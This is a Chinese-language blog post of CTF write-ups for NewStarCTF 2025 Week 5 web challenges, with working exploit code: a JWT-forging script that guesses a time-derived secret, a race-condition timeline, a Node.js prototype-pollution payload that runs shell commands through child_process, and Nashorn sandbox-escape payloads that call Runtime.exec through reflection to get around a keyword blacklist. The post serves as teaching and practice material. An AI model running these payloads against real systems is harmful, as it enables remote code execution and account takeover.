<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NewStarCTF-2025 | 猫涅的技术博客</title><meta name="author" content="nirvana_felis"><meta name="copyright" content="nirvana_felis"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前的CTF比赛个人题解(已完结！)">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF-2025">
<meta property="og:url" content="http://www.maonie.top/2025/09/29/NewStarCTF-2025/index.html">
<meta property="og:site_name" content="猫涅的技术博客">
<meta property="og:description" content="之前的CTF比赛个人题解(已完结！)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.maonie.top/cover/2.png">
<meta property="article:published_time" content="2025-09-29T11:45:40.000Z">
<meta property="article:modified_time" content="2025-11-10T07:36:39.349Z">
<meta property="article:author" content="nirvana_felis">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.maonie.top/cover/2.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "NewStarCTF-2025",
  "url": "http://www.maonie.top/2025/09/29/NewStarCTF-2025/",
  "image": "http://www.maonie.top/cover/2.png",
  "datePublished": "2025-09-29T11:45:40.000Z",
  "dateModified": "2025-11-10T07:36:39.349Z",
  "author": [
    {
      "@type": "Person",
      "name": "nirvana_felis",
      "url": "http://www.maonie.top"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.maonie.top/2025/09/29/NewStarCTF-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 6 || hour >= 22
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;84942c2dc16e4c38b669324fc8d1991d&quot;}"></script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'NewStarCTF-2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><style>
/* ===== Neocities draggable button box (final) ===== */
#friendButtonBox{
  position: fixed;
  top: 260px;
  left: 10px;
  width: 120px;
  padding: 8px;
  z-index: 9999;
  cursor: move;

  background-color: #e6e6e6;   /* 淡灰背景 */
  border: 3px double #000;     /* 黑色双线边框 */

  font-family: "Times New Roman", serif;
  font-size: 11px;
  color: #000;
}

.fb-preview{
  text-align: center;
  margin-bottom: 6px;
}

.fb-preview img{
  width: 88px;
  height: 31px;
  image-rendering: pixelated;
}

#friendButtonBox textarea{
  box-sizing: border-box;
  width: 100%;
  height: 65px;

  font-family: "Times New Roman", serif;
  font-size: 9px;
  line-height: 1.2;

  background-color: #f2f2f2;
  border: 2px double #000;
  resize: none;
}

.fb-hint{
  margin: 3px 0 0 0;
  text-align: center;
  user-select: none;
  opacity: 0.85;
}
@media (hover: none) and (pointer: coarse) {
 #friendButtonBox {
  display: none;
  }
}
</style>
</head><body><div id="web_bg" style="background-image: url(/img/1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fa fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/steamgames/"><i class="fa-fw fa-brands fa-steam"></i><span> steam</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://maonie.neocities.org/"><i class="fa-fw fas fa-heart"></i><span> 秘密结社</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/cover/2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">猫涅的技术博客</span></a><a class="nav-page-title" href="/"><span class="site-name">NewStarCTF-2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fa fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/steamgames/"><i class="fa-fw fa-brands fa-steam"></i><span> steam</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://maonie.neocities.org/"><i class="fa-fw fas fa-heart"></i><span> 秘密结社</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">NewStarCTF-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-29T11:45:40.000Z" title="发表于 2025-09-29 19:45:40">2025-09-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-10T07:36:39.349Z" title="更新于 2025-11-10 15:36:39">2025-11-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">25.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>125分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img gist" style="background-image: url(/cover/2.png)"></div><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;该文章自创建已过&quot;,&quot;messageNext&quot;:&quot;天 内容可能会过时 麻烦注意辨别&quot;,&quot;postUpdate&quot;:&quot;2025-11-10 15:36:39&quot;}" hidden></div><h2 id="完结感言（？）"><a href="#完结感言（？）" class="headerlink" title="完结感言（？）"></a>完结感言（？）</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="85.png" alt="85"></p>
<p>嗯 可算结束了 前两周刚开学所以把全题ak了 后边时间少了事情也多了 所以就只做了主副赛道的题目<br>这次的确学到很多 还见识不少新漏洞 收获挺大</p>
<h1 id="Week-5"><a href="#Week-5" class="headerlink" title="Week 5"></a>Week 5</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="废弃的网站"><a href="#废弃的网站" class="headerlink" title="废弃的网站"></a>废弃的网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">废弃的网站</span><br><span class="line">本题考查了「条件竞争」漏洞的简单利用。</span><br><span class="line">本题给出了服务的源码，你需要找出服务中存在的条件竞争点，并且通过条件竞争点来合理编写脚本来对服务进行攻击。</span><br></pre></td></tr></table></figure>

<p>首先 根据源码可以发现 admin权限所代表的token可以通过该环境的运行时间来计算出来 我这里利用脚本生成+burpsuite爆破 获取了能进入的token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//Token生成逻辑</span><br><span class="line">time_started = round(time.time())  # 应用启动时的Unix时间戳</span><br><span class="line">APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line"># 当前时间</span><br><span class="line">current_time = int(time.time())</span><br><span class="line"># 获取到的uptime（假设为1024秒）</span><br><span class="line">uptime = 1024</span><br><span class="line">base_time_started = current_time - uptime</span><br><span class="line"># 生成从base-10到base+10的time_started</span><br><span class="line">tokens = []</span><br><span class="line">for offset in range(-10, 11):</span><br><span class="line">    time_started = base_time_started + offset</span><br><span class="line">    secret = hashlib.sha256(str(time_started).encode()).hexdigest()</span><br><span class="line">    payload = &#123;&quot;id&quot;: 1, &quot;role&quot;: &quot;admin&quot;, &quot;name&quot;: &quot;Administrator&quot;&#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">    tokens.append(token)</span><br><span class="line"># 将token写入文件</span><br><span class="line">with open(&#x27;tokens.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    for token in tokens:</span><br><span class="line">        f.write(token + &#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="76.png" alt="76"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="75.png" alt="75"><br>提权只是第一步 接下来是找出条件竞争点并触发 获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">def admin_required(f):</span><br><span class="line">    def wrapper(*args, **kwargs):</span><br><span class="line">        cookie = request.cookies.get(&#x27;session&#x27;, None)</span><br><span class="line">        if cookie is None:</span><br><span class="line">            </span><br><span class="line">            response = redirect(&#x27;/&#x27;)</span><br><span class="line">            session = jwt.encode(USER_DB[&#x27;guest&#x27;], APP_SECRET, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">            response.set_cookie(&#x27;session&#x27;, session)</span><br><span class="line">            return response</span><br><span class="line">        try:</span><br><span class="line">            user_data = jwt.decode(cookie, APP_SECRET, algorithms=[&#x27;HS256&#x27;])</span><br><span class="line">            if user_data[&#x27;role&#x27;] != &#x27;admin&#x27;:</span><br><span class="line">                abort(403, description=&quot;Admin access required.&quot;)</span><br><span class="line">            if user_data[&#x27;name&#x27;] != &#x27;Administrator&#x27;:</span><br><span class="line">                abort(403, description=&quot;Admin access required.&quot;)</span><br><span class="line">            time.sleep(0.15)</span><br><span class="line">        except jwt.InvalidTokenError:</span><br><span class="line">            abort(401, description = f&quot;Session expired. Please log in again. System has been running &#123;round(time.time() - time_started)&#125; seconds.&quot;)</span><br><span class="line">        return f(*args, **kwargs)</span><br><span class="line">    wrapper.__name__ = f.__name__</span><br><span class="line">    return wrapper</span><br><span class="line"></span><br><span class="line">@app.before_request</span><br><span class="line">def load_user():</span><br><span class="line">    if request.endpoint == &#x27;static&#x27;:</span><br><span class="line">        return</span><br><span class="line">    global tempuser</span><br><span class="line">    cookie = request.cookies.get(&#x27;session&#x27;, None)</span><br><span class="line">    if cookie is None:</span><br><span class="line">        tempuser = USER_DB[&#x27;guest&#x27;]</span><br><span class="line">        session = jwt.encode(tempuser, APP_SECRET, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">        response = redirect(request.path)</span><br><span class="line">        response.set_cookie(&#x27;session&#x27;, session)</span><br><span class="line">        return response</span><br><span class="line">    try:</span><br><span class="line">        user_data = jwt.decode(cookie, APP_SECRET, algorithms=[&#x27;HS256&#x27;])</span><br><span class="line">        tempuser = user_data</span><br><span class="line">    except jwt.InvalidTokenError:</span><br><span class="line">        session = jwt.encode(USER_DB[&#x27;guest&#x27;], APP_SECRET, algorithm=&#x27;HS256&#x27;)</span><br><span class="line">        content = render_template_string(</span><br><span class="line">            &quot;Session expired. Please log in again. System has been running %d seconds.&quot; %</span><br><span class="line">            (round(time.time() - time_started))</span><br><span class="line">        )</span><br><span class="line">        response = app.make_response((content, 401))</span><br><span class="line">        response.set_cookie(&#x27;session&#x27;, session)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">时间线       线程A（攻击者）             线程B（污染者）</span><br><span class="line">t0          发送/admin请求 (guest token)  </span><br><span class="line">t1          权限检查通过（基于cookie）</span><br><span class="line">t2          ↓进入150ms等待             持续访问首页，设置tempuser</span><br><span class="line">t3          ↓                         load_user()将tempuser设为当前用户</span><br><span class="line">t4          ↓执行admin_panel()函数</span><br><span class="line">t5          读取tempuser（可能已被污染）</span><br><span class="line">t6          返回结果</span><br></pre></td></tr></table></figure>

<p>上边那段代码有0.15秒的延迟 可以通过污染tempuser来造成攻击 我这里通过两个burpsuite intruder同时传参 多次触发后成功获取<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="77.png" alt="77"></p>
<h3 id="小W和小K的故事（最终章）"><a href="#小W和小K的故事（最终章）" class="headerlink" title="小W和小K的故事（最终章）"></a>小W和小K的故事（最终章）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">小 W 和小 K 的故事（最终章）</span><br><span class="line">本题考查了 nodejs 中的「原型链污染」漏洞。</span><br><span class="line">尝试找出服务中存在的各个模块中，可能造成原型链污染的方法，并且上网搜寻其相关内容。</span><br><span class="line">当我们在对大多数服务（特别是 go，nodejs，python 等强模块相关的语言）进行渗透时，通常需要了解该服务中所利用到的模块的版本信息，并且根据模块版本信息来上网搜寻相关的 CVE，或者查询 github 上的历史 commit 中被修改掉的内容，很可能就是解题的关键。</span><br></pre></td></tr></table></figure>

<p>给了整个页面的逻辑 首先是能获取admin身份对应密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const rng = new random(114514);</span><br><span class="line"></span><br><span class="line">class Random &#123;</span><br><span class="line">    constructor(seed) &#123;</span><br><span class="line">        this.seed = (seed || Date.now()) % 998244353;</span><br><span class="line">    &#125;</span><br><span class="line">    next() &#123;</span><br><span class="line">        this.seed = (this.seed * 48271) % 998244353;</span><br><span class="line">        return this.seed;</span><br><span class="line">    &#125;</span><br><span class="line">    getRandomInt(min, max) &#123;</span><br><span class="line">        return min + (this.next() % (max - min));</span><br><span class="line">    &#125;</span><br><span class="line">    getRandomFloat(min, max) &#123;</span><br><span class="line">        return min + Math.sin(getRandomInt(0, 10000)) * (max - min);</span><br><span class="line">    &#125;</span><br><span class="line">    getRandomString(length) &#123;</span><br><span class="line">        const charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">        let result = &quot;&quot;;</span><br><span class="line">        for (let i = 0; i &lt; length; i++) &#123;</span><br><span class="line">            result += charset.charAt(this.getRandomInt(0, charset.length));</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = Random;</span><br></pre></td></tr></table></figure>

<p>可以看到random的生成逻辑是个伪随机 且生成种子seed也暴露了 是114514 我们拼接一下源代码 在其后加上<code>console.log(rng.getRandomString(16));</code> 生成admin密码的可能性 试个几次就有了<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="79.png" alt="79"><br>提权之后才能用原型链污染 这里通过强制使页面报错 并将报错代码改为命令运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;constructor&quot;: &#123;</span><br><span class="line">    &quot;prototype&quot;: &#123;</span><br><span class="line">      &quot;outputFunctionName&quot;: &quot;x;throw new Error(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;[具体payload]&#x27;).toString());x&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload改成cat &#x2F;flag最终成功了 但污染一次环境就会崩 得重开环境再试试<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="80.png" alt="80"></p>
<h3 id="眼熟的计算器"><a href="#眼熟的计算器" class="headerlink" title="眼熟的计算器"></a>眼熟的计算器</h3><p>java不是很熟 丢到idea解包 关键函数交给ai分析一下 提交payload 完事<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="82.png" alt="82"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">看到 Blacklisted word detected: new，说明 Java.type(&quot;java.util.Scanner&quot;)(...)这种写法在底层还是被识别为包含 &quot;new&quot;子串。可能是 Nashorn 内部将 Java.type(...)(...)转换成 new操作，或者黑名单检测在更深层次。</span><br><span class="line">我们需要完全避免任何可能产生 new的操作，包括 Java.type创建实例。</span><br><span class="line">1. 新思路：用现有的 Java API 中已有的对象来读取</span><br><span class="line">既然 Runtime.getRuntime().exec()可以执行命令，我们可以将结果写入文件，然后读取文件内容。</span><br><span class="line">var a=&quot;java.lang.&quot;+&quot;Runtime&quot;;</span><br><span class="line">var b=java.lang.Class.forName(a).getMethod(&quot;getRuntime&quot;).invoke(null);</span><br><span class="line">b.exec(&quot;sh -c &#x27;cat /flag &gt; /tmp/flag.txt&#x27;&quot;).waitFor();</span><br><span class="line">var lines=Java.type(&quot;java.nio.file.Files&quot;).readAllLines(Java.type(&quot;java.nio.file.Paths&quot;).get(&quot;/tmp/flag.txt&quot;));</span><br><span class="line">lines.get(0)</span><br><span class="line">这里：</span><br><span class="line">Files.readAllLines是静态方法，不需要 new</span><br><span class="line">Paths.get也是静态方法，不需要 new</span><br><span class="line">全程没有 new关键字</span><br><span class="line">2. 如果还不行，尝试用 ProcessBuilder 的静态方法（但需要实例）</span><br><span class="line">其实还是要创建实例。我们换一种：用 java.lang.ProcessImpl的反射启动进程，但可能也需要 newInstance。</span><br><span class="line">3. 用 Base64 编码命令执行结果，避免复杂读取</span><br><span class="line">var a=&quot;java.lang.&quot;+&quot;Runtime&quot;;</span><br><span class="line">var b=java.lang.Class.forName(a).getMethod(&quot;getRuntime&quot;).invoke(null);</span><br><span class="line">var c=b.exec(&quot;sh -c &#x27;cat /flag | base64&#x27;&quot;);</span><br><span class="line">var scanner=Java.type(&quot;java.util.Scanner&quot;)(c.getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="line">scanner.hasNext()?scanner.next():&quot;&quot;</span><br><span class="line">还是会有 new检测。</span><br><span class="line">4. 终极方案：用 JavaScript 自身拼接输出</span><br><span class="line">如果命令输出很短，我们可以用 InputStream.read()逐个字节读取，拼接字符串：</span><br><span class="line">var a=&quot;java.lang.&quot;+&quot;Runtime&quot;;</span><br><span class="line">var b=java.lang.Class.forName(a).getMethod(&quot;getRuntime&quot;).invoke(null);</span><br><span class="line">var c=b.exec(&quot;cat /flag&quot;);</span><br><span class="line">var i=c.getInputStream();</span><br><span class="line">var result=&quot;&quot;;</span><br><span class="line">var byteVal=i.read();</span><br><span class="line">while(byteVal!=-1)&#123;result+=String.fromCharCode(byteVal);byteVal=i.read();&#125;</span><br><span class="line">result</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">计算器 最终payload</span><br><span class="line">var a=&quot;java.lang.&quot;+&quot;Runtime&quot;;</span><br><span class="line">var b=java.lang.Class.forName(a).getMethod(&quot;getRuntime&quot;).invoke(null);</span><br><span class="line">var c=b.exec(&quot;cat /flag&quot;);</span><br><span class="line">var i=c.getInputStream();</span><br><span class="line">var result=&quot;&quot;;</span><br><span class="line">var byteVal=i.read();</span><br><span class="line">while(byteVal!=-1)&#123;result+=String.fromCharCode(byteVal);byteVal=i.read();&#125;</span><br><span class="line">result</span><br></pre></td></tr></table></figure>

<h3 id="Binary-Blog"><a href="#Binary-Blog" class="headerlink" title="Binary Blog"></a>Binary Blog</h3><p>第一步是提权 修改密码处有漏洞 改的时候可以随意控制对应的用户名 也就是说能改admin的密码 </p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="83.png" alt="83"></p>
<p>改好以admin的身份登录 在编辑博客处可以上传序列化后的php 格式为.dat的页面<br>虽然看起来没有回显 但是抓包后发现还是会有相应信息 转码后获取flag</p>
